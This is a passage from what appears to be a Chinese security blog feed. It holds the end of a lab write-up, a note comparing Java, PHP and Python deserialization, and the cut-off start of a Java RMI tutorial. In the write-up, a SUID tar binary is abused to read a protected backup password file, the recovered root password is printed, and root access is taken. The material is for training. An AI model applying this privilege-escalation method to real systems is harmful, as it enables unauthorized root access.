src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230417140819431.png" alt="image-20230417132325562"></p><p>在根目录发现一个属主为root并且所有用户都可执行的tar可执行程序</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230417133845483.png" alt="image-20230417133845483"></p><p>考虑到利用tar提权</p><p>在&#x2F;var&#x2F;backups目录下发现了.old_pass.bak这个敏感文件, 不过是读的权限不够</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230417140819431.png" alt="image-20230417140819431"></p><p>通过tar去对它进行备份拿到backup.tar</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230417140033516.png" alt="image-20230417140033516"></p><p>再使用自己的权限还原它 然后读到这个文件 是个密码</p><p><code>Ts&amp;4&amp;YurgtRX(=~h</code></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230417140736487.png" alt="image-20230417140736487"></p><p>拿到备份密码 su root</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230417140926256.png" alt="image-20230417140926256"></p><p>成功拿下</p><h4 id="9-总结"><a href="#9-总结" class="headerlink" title="9. 总结"></a>9. 总结</h4><p>第一次打pg靶场，发现挺多东西被改了，不能走进之前的死胡同里</p><p>提权方式有点意思，找利用tar的suid权限去刷新某个文件的权限</p>]]></content>
    
    
    <categories>
      
      <category>WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>OSCP</tag>
      
      <tag>打靶</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaSecNotes-不同语言中的反序列化漏洞</title>
    <link href="/2023/03/31/JavaSecNotes-%E4%B8%8D%E5%90%8C%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/03/31/JavaSecNotes-%E4%B8%8D%E5%90%8C%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h3 id="1-背景"><a href="#1-背景" class="headerlink" title="1. 背景"></a>1. 背景</h3><hr><p>前面的学习中学到了RMI的一些流程和攻击方法，在调试RMI时会发现，其接收，发送的数据都是反序列化数据。反序列化在安全领域很常见，不同语言都有此类方法，且或多或少都有点漏洞，那么为什么反序列化常常会带来安全隐患？</p><h3 id="2-JSON-amp-XML"><a href="#2-JSON-amp-XML" class="headerlink" title="2. JSON&amp;XML"></a>2. JSON&amp;XML</h3><hr><p>一门成熟的语言，如果需要在网络上传递信息，通常需要用到一些格式化数据。</p><ul><li>JSON</li><li>XML</li></ul><p>JSON和XML都是通用的数据交互格式，通产用于不同语言，不同环境下数据的交互，比如前端JS通过JSON和后端通信，微信服务器通过XML和公众号服务器通信。但是这两种数据格式都有一个问题：不支持复杂的数据类型。</p><p>大多数处理方法中JSON和XML支持的数据类型就是基本数据类型，int、float、string、boolean，如果开发者希望在数据传输的时候直接传输一个对象，那么就不得不想办法拓展基础的JSON（XML）语法。</p><p>类似于Jackson和Fastjson这类序列化库，在JSON(XML)的基础上进行改造，通过特定的语法来传递对象；或者如RMI，直接用Java等语言内置的序列化方法，将一个对象转换成一串二进制数进行传输。</p><p>不管是Jackson、Fastjson还是内置的序列化方法，一旦涉及到序列化与反序列化数据，就可能会设计到安全问题。</p><h3 id="3-反序列化方法的对比"><a href="#3-反序列化方法的对比" class="headerlink" title="3. 反序列化方法的对比"></a>3. 反序列化方法的对比</h3><hr><p>Java的反序列化，相比于PHP、Python的反序列化有什么异同？</p><p>Java的反序列化和PHP的反序列化有点类似，都只能将一个对象中的属性按照某种特定的格式生成一段数据流，在反序列化的时候再按照这个格式将属性拿出来，再赋值给新的对象。</p><p>但是在Java相对于PHP序列化更深入的地方在于，Java提供了更高级、灵活的方法<code>writeObject</code>，允许开发者在序列化流中插入一些自定义数据，进而在反序列化的时候能够使用<code>readObject</code>进行读取。</p><p>当然，PHP中也提供了一个魔术方法叫 <code>__wakeup </code>，在反序列化的时候进行触发。很多人会认为Java的 <code>readObject</code>和PHP的<code>__wakeup</code>类似，但其实不全对，虽然都是在反序列化的时候触发，但他们解决的问题稍微有些差异。</p><p>Java设计 readObject 的思路和PHP的<code>__wakeup</code> 不同点在于：<code>readObject</code>倾向于解决**”反序列化时如何还原一个完整对象”<strong>这个问题，而PHP的 <code>__wakeup</code> 更倾向于解决</strong>“反序列化后如何初始化这个对象”**的 问题。</p><h4 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="Java反序列化"></a>Java反序列化</h4><p>Java反序列化的操作，很多是需要开发者深度参与的，所以大量的库会实现<code>readObject</code>、<code>writeObject</code>方法，这和PHP中的<code>__wakeup</code>、<code>__sleep</code>很少使用时存在鲜明对比的。</p><p>Java在序列化时一个对象，将会调用这个对象中的<code>writeObject</code>方法，参数类型是<code>ObjectOutputStream</code>，开发者可以将任何内容写入这个stream中;反序列化时，会调用<code>readObject</code>，开发者也可以从中读取出前面写入的内容，并进行处理。</p><p>如下便是一个Java序列化与反序列化的例子。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> Neil</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SerializationDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">// 创建一个Person对象</span><br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;张三&quot;</span>, <span class="hljs-number">25</span>);<br><br>        <span class="hljs-comment">// 将对象序列化到文件中</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fileOut</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;person.ser&quot;</span>);<br>            <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(fileOut);<br>            out.writeObject(person);<br>            out.close();<br>            fileOut.close();<br>            System.out.println(<span class="hljs-string">&quot;Person对象已经被序列化到person.ser文件中&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br><br>        <span class="hljs-comment">// 从文件中反序列化对象</span><br>        Person deserializedPerson;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fileIn</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;person.ser&quot;</span>);<br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(fileIn);<br>            deserializedPerson = (Person) in.readObject();<br>            in.close();<br>            fileIn.close();<br>        &#125; <span class="hljs-keyword">catch</span> (IOException | ClassNotFoundException e) &#123;<br>            e.printStackTrace();<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br><br>        <span class="hljs-comment">// 打印反序列化后的对象信息</span><br>        System.out.println(<span class="hljs-string">&quot;反序列化后的Person对象:&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;Name: &quot;</span> + deserializedPerson.getName());<br>        System.out.println(<span class="hljs-string">&quot;Age: &quot;</span> + deserializedPerson.getAge());<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>两个核心方法<code>writeObject</code>和<code>readObject</code></p><p><code>writeObject</code>方法是将一个对象序列化并写入到输出流中，而<code>readObject</code>方法则是从输入流中读取数据并反序列化为一个对象。</p><p>具体来说，<code>writeObject</code>方法会将对象的各个字段以及对象的类信息等序列化为二进制流，并写入到输出流中。这些二进制数据包含了对象的状态和类的信息，可以被传输和存储，以便在需要的时候可以将其反序列化为原始的Java对象。</p><p><code>readObject</code>方法则是读取序列化的二进制数据，并将其反序列化为一个Java对象。在读取过程中，Java会根据序列化数据中包含的类信息来构造新的对象，并将序列化数据中的状态数据填充到这个对象中。最终，<code>readObject</code>方法返回一个反序列化后的Java对象。</p><p>对于多个对象通过<code>writeObject</code>的序列化写入到输出流时，在<code>readObject</code>从输入流中读对象需要遵循它的顺序。</p><p>调用<code>writeObject()</code>方法将对象序列化到输出流中时，Java会自动为对象生成序列化ID，并将其写入输出流。在反序列化过程中，Java会读取输入流中的序列化ID，并与本地类的序列化ID进行比较。如果两个ID相同，Java会使用本地类的定义来反序列化对象；如果两个ID不同，Java会抛出<code>InvalidClassException</code>异常。</p><p>如果在写入对象时更改了对象的结构，例如添加或删除字段，那么在读取对象时，Java可能无法正确地解析它，因为读取的数据与本地类的定义不同。在这种情况下，Java会抛出<code>InvalidClassException</code>异常。</p><p>在上一篇中，聊到了<code>classAnnotations</code>，这次来聊聊<code>objectAnnotation</code></p><p>Java在序列化时一个对象，将会调用这个对象中的<code>writeObject</code>方法，参数类型时<code>ObjectOutputStream</code>, 开发者可以将任何内容写入到这个stream中；反序列化时，会调用<code>readObject</code>， 开发者也可以从中读取出前面写入的内容，并进行处理。</p><p>比如说下面这个类:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.neil.javathings.serialization;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">java</span>.io.Serializable &#123;<br>    <span class="hljs-keyword">public</span> String name;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> age;<br><br>    Person(String name, <span class="hljs-type">int</span> age) &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeObject</span><span class="hljs-params">(java.io.ObjectOutputStream s)</span> <span class="hljs-keyword">throws</span><br>            IOException &#123;<br>        s.defaultWriteObject();<br>        s.writeObject(<span class="hljs-string">&quot;This is a object&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br>            <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        s.defaultReadObject();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> (String) s.readObject();<br>        System.out.println(message);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在这里执行完默认的<code>s.defaultReadObject()</code>后，我向stream中写入了一个字符串<code>this is a object</code>。通过抓包和SerializationDumper查看此时生成的序列化数据:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">objectAnnotation</span><br>   <span class="hljs-attribute">TC_STRING</span> - <span class="hljs-number">0</span>x74<br>     <span class="hljs-attribute">newHandle</span> <span class="hljs-number">0</span>x00 <span class="hljs-number">7</span>e <span class="hljs-number">00</span> <span class="hljs-number">05</span><br>     <span class="hljs-attribute">Length</span> - <span class="hljs-number">16</span> - <span class="hljs-number">0</span>x00 <span class="hljs-number">10</span><br>     <span class="hljs-attribute">Value</span> - This is a object - <span class="hljs-number">0</span>x546869732069732061206f626a656374<br>   <span class="hljs-attribute">TC_ENDBLOCKDATA</span> - <span class="hljs-number">0</span>x78<br></code></pre></td></tr></table></figure><p>可见，我们写入的<code>this is a object</code>被放在<code>objectAnnotation</code>位置</p><p>在反序列化时，我读取了这个字符串，并将其输出。</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230331154904754.png" alt="image-20230331154904754"></p><p>这个特征就让Java开发变得非常灵活。HashMap，其就是将Map中的所有键、值都存储在<code>objectAnnotation</code>中，而不是某个具体的属性里。</p><h4 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h4><p>PHP的序列化是开发者不能参与的，开发者调用<code>serialize</code>函数后，序列化的数据就已经完成的，得到的是一个完整的对象，我们并不能在序列化数据流里新增某一个内容，如果想插入新的内容，只能将其保存在一个属性中，也就是说PHP的序列化、反序列化是一个纯内部的过程，而其<code>__sleep</code>、<code>__wakeup</code>魔术方法的目的就是在序列化、反序列化的前后执行一些操作。</p><p>一个非常典型的PHP序列化例子，就是含有资源类型的PHP类，如数据库连接：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Connection</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$link</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$dsn</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$dsn</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;dsn = <span class="hljs-variable">$dsn</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">connect</span>();<br>&#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">connect</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;link = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(<span class="hljs-variable">$this</span>-&gt;dsn, <span class="hljs-variable">$this</span>-&gt;username, <span class="hljs-variable">$this</span>-&gt;password);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>PHP中，资源类型的对象默认是不会写入序列化数据中的。那么上述Connection类的$link属性在序列化后就是null，反序列化时拿到的也是null。</p><p>如果我想反序列化时拿到<code>$link</code>，我就需要编写<code>__wakeup</code>方法。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Connection</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$link</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$dsn</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$dsn</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;dsn = <span class="hljs-variable">$dsn</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">connect</span>();<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">connect</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;link = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(<span class="hljs-variable">$this</span>-&gt;dsn, <span class="hljs-variable">$this</span>-&gt;username, <span class="hljs-variable">$this</span>-&gt;password);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__sleep</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;dsn&#x27;</span>, <span class="hljs-string">&#x27;username&#x27;</span>, <span class="hljs-string">&#x27;password&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">connect</span>();<br>    &#125;<br></code></pre></td></tr></table></figure><p>可见，这里<code>__wakeup</code>的工作就是在反序列化拿到Connection对象后，执行<code>connect()</code>函数，连接数据库。</p><p><code>__wakeup</code>的作用在反序列化后，执行一些初始化操作。但其实我们很少利用序列化数据传递资源类型的对象，而其他类型的对象，在反序列化的时候就已经赋予其值了。</p><p>PHP的反序列化漏洞，很少是由<code>__wakeup</code>这个方法触发的，通常触发在析构函数<code>__destruct</code>里。大多数PHP反序列化漏洞，都不是由反序列化导致的，只是通过反序列化可以控制对象的属性，进而在后续的代码中进行危险操作。</p><h4 id="Python反序列化"><a href="#Python反序列化" class="headerlink" title="Python反序列化"></a>Python反序列化</h4><p>Python反序列化和Java、PHP有个显著的区别，就是Python的反序列化过程实际上是在执行一个基于栈的虚拟机。可以向栈上增、删对象，也可以执行一些指令，比如函数的执行等，甚至可以用这个虚拟机执行一个完整的应用程序。</p><p>所以，Python的反序列化可以立即导致任意函数、命令执行漏洞，于需要gadget的PHP和Java相比更加危险。</p><p>可以参考<a href="https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html">https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html</a></p><h3 id="4-总结"><a href="#4-总结" class="headerlink" title="4. 总结"></a>4. 总结</h3><p>从危害上来看，Python的反序列化危害是最大的; 从应用广度上来看，Java的反序列化是最常被用到的;从反序列化的原理上来看，PHP和Java是类似又不尽相同的。</p><h3 id="5-Reference"><a href="#5-Reference" class="headerlink" title="5. Reference"></a>5. Reference</h3><p><a href="https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html">https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html</a></p><p><a href="https://wx.zsxq.com/dweb2/index/topic_detail/421452521558848">https://wx.zsxq.com/dweb2/index/topic_detail/421452521558848</a></p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaSecNotes-RMI</title>
    <link href="/2023/03/21/JavaSecNotes-RMI/"/>
    <url>/2023/03/21/JavaSecNotes-RMI/</url>
    
    <content type="html"><![CDATA[<h3 id="1-RMI简介"><a href="#1-RMI简介" class="headerlink" title="1. RMI简介"></a>1. <code>RMI</code>简介</h3><p><code>RMI</code>全称是<code>Remote Method Invocation</code>，远程方法调用。从这个名字就可以看出，他的目标和<code>RPC</code>其实是类似的，是让某个Java虚拟机上的对象调用另⼀个Java虚拟机中对象上的方法，只不过<code>RMI</code>是Java独有的⼀种机制。</p><h3 id="2-RMI实现"><a href="#2-RMI实现" class="headerlink" title="2. RMI实现"></a>2. <code>RMI</code>实现</h3><p>以下是一个<code>RMI</code>服务器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> rmi;<br><br><span class="hljs-keyword">import</span> java.rmi.Naming;<br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.server.UnicastRemoteObject;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> Neil</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">IRemoteHelloWorld</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br>        String <span class="hljs-title function_">hello</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RemoteHelloWorld</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IRemoteHelloWorld</span> &#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-title function_">RemoteHelloWorld</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>            <span class="hljs-built_in">super</span>();<br>        &#125;<br>        <br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">hello</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>            System.out.println(<span class="hljs-string">&quot;call from&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello world&quot;</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">RemoteHelloWorld</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteHelloWorld</span>();<br>        LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        Naming.rebind(<span class="hljs-string">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>, h);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">RMIServer</span>().start();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>一个<code>RMI Server</code>分为三个部分：</p><ol><li>一个继承了<code>java.rmi.Remote</code>接口，其中定义我们要远程调用的函数，比如这里的<code>hello()</code></li><li>一个实现了此接口的嘞</li><li>一个主类，用来创建<code>Registry</code>，并将上面的类实例化后绑定到一个地址。这里就是所谓的<code>Server</code>了</li></ol><p>以下是一个<code>RMI Client</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> rmi;<br><br><span class="hljs-keyword">import</span> java.rmi.Naming;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> Neil</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        RMIServer.<span class="hljs-type">IRemoteHelloWorld</span> <span class="hljs-variable">hello</span> <span class="hljs-operator">=</span> (RMIServer.IRemoteHelloWorld)<br>                Naming.lookup(<span class="hljs-string">&quot;rmi://192.168.135.142:1099/Hello&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">ret</span> <span class="hljs-operator">=</span> hello.hello();<br>        System.out.println(ret);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>RMI 